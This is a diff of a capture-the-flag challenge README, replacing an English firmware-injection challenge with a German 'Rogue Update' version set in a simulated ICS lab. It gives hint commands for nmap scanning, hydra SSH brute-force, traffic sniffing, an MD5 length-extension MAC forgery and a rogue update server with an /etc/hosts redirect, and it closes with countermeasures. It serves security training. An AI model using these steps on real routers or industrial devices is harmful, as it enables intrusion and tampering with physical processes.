@@ -1,303 +1,279 @@
-# 🔧 Malicious Firmware Update Injection
+# Rogue Update
 
-> **MITRE ATT&CK for ICS:** `Impair Process Control` | `Modify Firmware` | `Unauthorized Command Message`
-
----
-
-## 📋 Overview
-Modern industrial devices and IoT gateways often rely on remote firmware updates to fix bugs and deploy new features. However, insecure update mechanisms can become a critical attack vector.
-
-In this challenge, you will:
-- Compromise a gateway device
-- Analyze internal network traffic
-- Identify an update mechanism
-- Manipulate firmware
-- Inject a malicious update
-
-Your goal is to **force the device to install a malicious firmware and trigger the flag**.
+> **Kategorie:** Advanced Security | **Punkte:** 500
+>
+> **MITRE ATT&CK for ICS:** `Impair Process Control / Modify Firmware` | `Initial Access / Valid Accounts` | `Discovery / Network Sniffing` | `Command and Control / Application Layer Protocol`
 
 ---
 
-## 🎯 Objectives
-- Reverse engineer a binary to gain access to the gateway
-- Pivot into the internal network
-- Identify the firmware update process
-- Modify firmware and bypass update validation
-- Successfully deploy a malicious firmware
+## Das Szenario
+
+*Irgendwo in einer süddeutschen Kleinstadt brummt ein Verteilerkasten vor sich hin. Drinnen: ein STM32-Mikrocontroller, der seit Jahren brav seinen Dienst tut. Einmal im Monat — oder öfter, wenn der Hersteller einen Patch schiebt — lädt er sich automatisch neue Firmware vom internen Update-Server. Kein Mensch schaut zu. Der Daemon fragt einfach alle 30 Sekunden: „Gibt's was Neues für mich?"*
+
+*Heute bist du die Antwort.*
 
 ---
 
-## 🔄 Attack Flow
+PhysLab Industries betreibt hinter einem OpenWrt-Gateway-Router ein internes OT-Netz. Das externe Wartungsnetz — eigentlich nur für den Außendienst gedacht — ist von außen erreichbar. Die Firewall-Regeln wurden „vorübergehend" gelockert, der Praktikant hat das Router-Passwort gesetzt und niemand hat es seitdem geändert.
+
+Der Firmware-Update-Kanal ist kryptografisch geschützt — *oder zumindest glaubt das die Entwicklerin, die ihn aufgebaut hat.* Der MAC wird beim Download mitgeliefert, der Daemon prüft ihn vor dem Flashen. Was sie übersehen hat: Das verwendete MAC-Schema hat eine bekannte Schwäche. Wer den MAC und die Länge des Secrets kennt, kann neue Payloads anhängen — ganz ohne den Schlüssel.
+
+Deine Mission: Einbruch in das Gateway, Übernahme des Firmware-Update-Kanals von innen heraus — und bevor der Daemon das nächste Mal fragt, bist du die Antwort.
+
+**Der Countdown läuft. 30 Sekunden.**
+
+---
+
+## Netzwerk-Topologie
+
 ```
-Attacker → Gateway → Internal Device → Update Server
-
-   |         |             |                |
-   | RE      |             |                |
-   |-------->|             |                |
-   |         | SSH Access  |                |
-   |         |------------>|                |
-   |         | Sniff Traffic               |
-   |         |------------>|                |
-   |         |             | Request FW     |
-   |         |             |--------------->|
-   |         | Manipulate Update Source     |
-   |         |----------------------------->|
-   |         |             | Install FW     |
-   |         |             |--------------->|
-   |         |             | Trigger Flag   |
-```
-
----
-
-## 🧠 Challenge Description
-
-You are given access to a **gateway binary** extracted from a router.
-
-Your task is to:
-1. Analyze the binary to retrieve credentials
-2. Access the gateway system
-3. Monitor internal network traffic
-4. Identify how firmware updates are retrieved
-5. Replace the legitimate firmware with a malicious version
-6. Trigger the flag through firmware execution
-
----
-
-## 🧩 Phase 1: Gateway Compromise
-
-### 🔍 Task
-Analyze the provided binary:
-```
-gateway_service
+Du (Kali / ext_ctf)
+172.22.0.100
+     |
+     |  ext_ctf (172.22.0.0/24)
+     |
+OpenWrt Router (QEMU in Docker)
+     extern:  172.22.0.2   (SSH :2222, HTTP :8080)
+     intern:  172.18.0.50  (Brücke ins ICS-Netz)
+     |
+     |  virtual_virt-cybics (172.18.0.0/24)
+     |
+     +--- HWIO          172.18.0.2
+     +--- OpenPLC       172.18.0.3
+     +--- FUXA HMI      172.18.0.4
+     +--- OPC-UA        172.18.0.5
+     +--- S7COM         172.18.0.6
+     +--- STM32         172.18.0.7
+     +--- Firmware-Upd. 172.18.0.8
+     +--- Update-Server 172.18.0.9
 ```
 
-### 🎯 Goal
-Find credentials or hidden functionality to access the gateway.
-
-### 💡 Hint
-Look for:
-- Hardcoded strings
-- Credentials
-- Suspicious functions
+Das interne ICS-Netz ist ohne Pivot über den Router **nicht erreichbar**.
 
 ---
 
-## 🌐 Phase 2: Network Analysis
+## Angriffskette auf einen Blick
 
-Once you have access to the gateway:
+```
+Phase 1: Recon im externen Netz
+    → Router-IP und offene Ports finden
 
-### 🔍 Task
-- Monitor internal traffic
-- Identify periodic connections
+Phase 2: Initial Access
+    → SSH-Brute-Force gegen den Router
 
-### 🎯 Goal
-Find the firmware update endpoint
+Phase 3: Traffic-Analyse auf dem Router
+    → Periodische Update-Anfragen belauschen und Ziel identifizieren
 
-### 💡 Hint
-Use:
+Phase 4: Update-Mechanismus analysieren
+    → API-Endpunkte erkunden, Dokumentation finden
+
+Phase 5: Firmware und MAC herunterladen
+    → Firmware-Image und originale MAC beschaffen
+
+Phase 6: MAC fälschen
+    → Length Extension Attack gegen MD5(secret || firmware)
+
+Phase 7: Manipulierte Firmware einschleusen
+    → Rogue-Server auf dem Router starten, DNS umbiegen
+```
+
+---
+
+## Phase 1 — Reconnaissance
+
+Du startest im `ext_ctf`-Netz (`172.22.0.0/24`). Die einzige Verbindung zur Außenwelt, die der Außendienst von PhysLab Industries nutzt — und die seit dem letzten Audit niemand mehr richtig gesperrt hat.
+
+### Aufgabe
+Scanne das externe Netz nach aktiven Hosts und offenen Diensten.
+
+<details>
+<summary>Hinweis</summary>
+
 ```bash
-tcpdump
-wireshark
-netstat
+nmap 172.22.0.0/24
 ```
 
-Look for:
-- HTTP requests
-- Repeated connections
-- Firmware downloads
+Du solltest einen Host mit zwei offenen Diensten finden — darunter einen SSH-Dienst auf einem nicht-standardmäßigen Port.
+
+</details>
 
 ---
 
-## 🔄 Phase 3: Update Mechanism Analysis
+## Phase 2 — Initial Access: SSH-Brute-Force
 
-### 🔍 Task
-Deep dive into the update server behavior after you discover its host.
+Der Router läuft auf OpenWrt. Das Root-Passwort hat ein Praktikant gesetzt — kurz, einprägsam, und in keiner Passwortrichtlinie je geprüft.
 
-- Interact with the server directly
-- Map reachable web/API paths
-- Reconstruct the firmware download flow end-to-end
+### Aufgabe
+Erlange per SSH-Brute-Force Zugang zum Router. Achte auf den richtigen Port.
 
-### 🎯 Goal
-Build a clear model of how a device asks for, receives, and validates firmware from the update server.
+<details>
+<summary>Hinweis</summary>
 
-### 🎯 Questions to answer
-- Which endpoint starts the update check?
-- Which request fields influence version selection?
-- Which endpoint returns metadata vs. the binary itself?
-- What headers, status codes, and content types are used?
-- Is there any signature/hash/integrity mechanism in the exchange?
-
-### 💡 Hint
-After identifying the update host, do endpoint discovery instead of guessing paths manually.
-
-Use a content-discovery wordlist (for example from SecLists):
-`https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content`
-
-Start with focused fuzzing and inspect interesting responses:
 ```bash
-export UPDATE_HOST="http://<update-server-ip-or-name>"
-ffuf -u "$UPDATE_HOST/FUZZ" -w /path/to/SecLists/Discovery/Web-Content/combined.txt -e .json -v
+hydra -l root -P <wordlist> ssh://172.22.0.2 -s <port>
 ```
 
-Prioritize findings that look like:
-- API schemas or interactive docs
-- Version/check/update routes
-- Download endpoints returning `application/octet-stream` or similar
+Das Passwort ist kurz. Du brauchst keine riesige Wörterbuchliste — eine kleine reicht. Schau, was auf deiner Kali-Maschine unter `/usr/share/dirb/wordlists/` bereitliegt.
+
+> **Tipp:** OpenWrt bringt `opkg` mit — den Paketmanager des Routers. Mit `opkg update && opkg install <paket>` lassen sich viele Tools nachinstallieren (z. B. `tcpdump`, `curl`, `python3`).
+
+</details>
 
 ---
 
-## 🧱 Phase 4: Firmware Analysis
+## Phase 3 — Traffic-Analyse auf dem Router
 
-You obtain a firmware file:
-```
-firmware.bin
-```
+Du bist auf dem Router. Von hier aus hast du Sicht ins interne ICS-Netz `172.18.0.0/24` — dein Angreifer-Laptop dagegen ist blind. Was hier fließt, bleibt hier.
 
-### 🔍 Task
-- Extract firmware
-- Analyze structure
-- Modify contents
+Lausche dem Netzwerkverkehr auf der internen Schnittstelle. Irgendwas im Netz verhält sich seltsam — regelmäßig, alle 30 Sekunden.
 
-### 💡 Hint
-Use:
+### Aufgabe
+Identifiziere den internen Host, der periodische HTTP-Anfragen aussendet, und ermittle sein Ziel.
+
+<details>
+<summary>Hinweis</summary>
+
 ```bash
-binwalk firmware.bin
+# Auf dem Router (via SSH):
+tcpdump -i <interface> -n
 ```
 
-Look for:
-- filesystem
-- scripts
-- init files
+Wireshark kann tcpdump-Streams live über eine SSH-Pipe verarbeiten — das macht die Analyse komfortabler.
+
+Du wirst feststellen, dass `172.18.0.8` in regelmäßigen Abständen versucht, einen bestimmten internen Server zu erreichen. Notiere dir IP und Port — das ist dein nächstes Ziel.
+
+</details>
 
 ---
 
-## 💣 Phase 5: Malicious Firmware Injection
+## Phase 4 — Update-Mechanismus analysieren
 
-### 🔍 Task
-Modify the firmware to execute your own logic.
+Du kennst jetzt den Update-Server. Zeit, seine Oberfläche zu kartieren.
 
-### 🎯 Goal
-Trigger the flag after installation.
+Viele interne Server in OT-Umgebungen werden mit Entwickler-Defaults betrieben — inklusive interaktiver API-Dokumentation, die im Produktivbetrieb nichts verloren hat.
 
-### 💡 Possible approaches
-- Modify init scripts
-- Add new executable
-- Change configuration
+### Aufgabe
+Erkunde den Update-Server und finde heraus, welche Endpunkte er anbietet und wie Anfragen aufgebaut sein müssen.
 
----
+<details>
+<summary>Hinweis</summary>
 
-## 🌐 Phase 6: Update Hijacking
+```bash
+ffuf -w <wordlist> -u http://172.18.0.9:<port>/FUZZ
+```
 
-### 🔍 Task
-Force the device to download your firmware.
+Ein bestimmtes Verzeichnis verrät dir alles: verfügbare Endpunkte, erwartete Parameter — und die Länge eines bestimmten Secrets.
 
-### 🎯 Possible methods
-- Modify DNS / hosts
-- Redirect traffic
-- Replace update server
+> **Tipp:** Um den Update-Server aus deinem Kali-Netz zu erreichen, brauchst du einen Tunnel durch den Router. Schau, welche SSH-Optionen dir dabei helfen können.
+
+</details>
 
 ---
 
-## 🚀 Expected Outcome
+## Phase 5 — Firmware und MAC herunterladen
 
-If successful:
-- The device installs your firmware
-- Your payload executes
-- The flag is generated
+Der Server stellt Firmware-Images zum Download bereit. Beim Download passiert etwas Interessantes: Der Response enthält nicht nur die Firmware — er verrät auch etwas über den Verifikationsmechanismus.
+
+### Aufgabe
+Lade die aktuelle Firmware herunter und extrahiere den MAC aus dem HTTP-Response.
+
+<details>
+<summary>Hinweis</summary>
+
+```bash
+curl http://172.18.0.9:<port>/api/v1/firmware/download/<version> \
+     -D headers.txt -o firmware.bin
+```
+
+Lies die Response-Header sorgfältig. Einer davon enthält den MAC-Wert, den der Daemon zur Verifikation einsetzt. Du wirst ihn brauchen.
+
+</details>
 
 ---
 
-## 🏁 Flag Condition
+## Phase 6 — MAC fälschen: Length Extension Attack
 
-The flag is triggered when:
-- A modified firmware is successfully installed
-- A specific condition inside the firmware is met
+Die Firmware-Verifikation nutzt `MD5(secret || firmware)`. Das klingt sicher — ist es aber nicht.
+
+Das Schema ist anfällig für einen **Length Extension Attack**: Mit dem bekannten MAC und der Länge des Secrets kannst du einen gültigen MAC für `firmware || padding || dein_payload` erzeugen — *ganz ohne den Schlüssel zu kennen*.
+
+### Aufgabe
+Hänge einen eigenen Payload an die Firmware an und berechne einen gültigen MAC dafür.
+
+<details>
+<summary>Hinweis</summary>
+
+Das Tool `hash_extender` ist für genau diesen Angriff gebaut. Du brauchst:
+- den originalen MAC aus Phase 5
+- die Firmware aus Phase 5
+- die Schlüssellänge (die API-Dokumentation hat sie dir verraten)
+- deinen Payload
+
+Das Ergebnis: eine manipulierte Firmware-Datei und ein neuer MAC, den der Daemon akzeptieren wird.
+
+</details>
 
 ---
 
-## 🚩 Flag
+## Phase 7 — Manipulierte Firmware einschleusen
+
+Der Daemon fragt alle 30 Sekunden: `update.cybics` — ein Hostname. Er löst über `/etc/hosts` auf. Du kontrollierst den Router. Das reicht.
+
+Der elegante Weg: Du startest den Rogue-Server nicht auf deiner Angreifer-Maschine, sondern *auf dem Router selbst*. Der Daemon fragt localhost — und bekommt deine Firmware.
+
+### Aufgabe
+Kopiere deine manipulierte Firmware und ein Server-Skript auf den Router, starte den Rogue-Server und biege die DNS-Auflösung um.
+
+<details>
+<summary>Hinweis</summary>
+
+```bash
+# Dateien auf den Router kopieren
+scp -O -P <port> server.py forged.bin root@172.22.0.2:/root/
+
+# Rogue-Server auf dem Router starten und DNS umbiegen
+ssh -p <port> root@172.22.0.2 "
+  <env-variablen> python3 /root/server.py &
+  echo '127.0.0.1 update.cybics' >> /etc/hosts
+"
+```
+
+Wenn alles klappt, siehst du im Daemon-Log `** Programming Finished **`. Der Flag ist aktiv.
+
+</details>
+
+---
+
+## Flag
+
 ```
 CybICS(malicious_firmware_injected)
 ```
 
 ---
 
-## 🛡️ Security Insights
+## Security Insights
 
-This challenge demonstrates real-world weaknesses:
+Diese Challenge illustriert eine Angriffskette, die sich so oder ähnlich in echten ICS-Umgebungen findet:
 
-### ❌ Common Issues
-- No firmware signature validation
-- Insecure update channels (HTTP)
-- Trusting internal network blindly
-
-### ✅ Secure Design Would Include
-- Signed firmware (PKI)
-- Secure boot
-- TLS with certificate validation
-- Update integrity verification
+| Schwachstelle | Auswirkung | Gegenmaßnahme |
+|---|---|---|
+| Schwaches Router-Passwort | Initial Access per Brute-Force | Starke, einzigartige Credentials; keine Default-Passwörter |
+| `MD5(secret \|\| data)` als MAC | Length Extension Attack ohne Key | HMAC verwenden (z. B. HMAC-SHA256) |
+| HTTP statt HTTPS für Updates | Traffic-Analyse / Man-in-the-Middle | TLS mit Zertifikatsvalidierung |
+| Fehlende Firmware-Signatur | Beliebige Firmware einschleusen | Asymmetrische Signaturen (z. B. Ed25519) + Secure Boot |
+| Exponierte API-Dokumentation | Endpoint-Discovery vereinfacht | Produktion ohne `/docs`-Endpunkt deployen |
+| Schreibzugriff auf `/etc/hosts` | DNS-Spoofing lokal möglich | Minimale Schreibrechte; Read-only-Rootfs |
 
 ---
 
-## 📚 MITRE ATT&CK Mapping
+## MITRE ATT&CK for ICS Mapping
 
-| Tactic | Technique | Description |
-|--------|----------|-------------|
-| Impair Process Control | Modify Firmware | Malicious firmware injection |
-| Initial Access | Valid Accounts | Credentials extracted from binary |
-| Lateral Movement | Internal Pivoting | Access to internal network |
-| Command and Control | Application Layer Protocol | HTTP-based update |
-
----
-
-## 🔍 Solution (Spoiler)
-
-<details>
-  <summary><span style="color:orange;font-weight: 900">Click to expand</span></summary>
-
-### 🧠 Steps
-
-1. Reverse engineer binary:
-```bash
-strings gateway_service
-```
-
-2. Extract credentials
-
-3. SSH into gateway
-
-4. Monitor traffic:
-```bash
-tcpdump -i eth2
-```
-
-5. Identify update URL:
-```
-http://172.18.0.50:8080/api/v1/firmware/latest
-```
-
-6. Extract firmware:
-```bash
-binwalk -e firmware.bin
-```
-
-7. Modify init script:
-```bash
-echo "echo CybICS(malicious_firmware_injected) > /flag.txt" >> init.sh
-```
-
-8. Repack firmware
-
-9. Redirect update server:
-```bash
-echo "attacker_ip updateserver" >> /etc/hosts
-```
-
-10. Serve malicious firmware:
-```bash
-python3 -m http.server 80
-```
-
-11. Wait for update → flag triggered
-
-</details>
+| Taktik | Technik | Beschreibung |
+|---|---|---|
+| Initial Access | Valid Accounts | SSH-Brute-Force gegen den Gateway-Router |
+| Discovery | Network Sniffing | tcpdump auf internem Router-Interface |
+| Discovery | Remote System Discovery | Erkundung des Update-Servers via ffuf |
+| Command and Control | Application Layer Protocol | HTTP-basierter Firmware-Update-Kanal |
+| Impair Process Control | Modify Firmware | Manipulation des Firmware-Images via Length Extension |
+| Execution | — | Ausführung über automatisierten Flash-Vorgang |
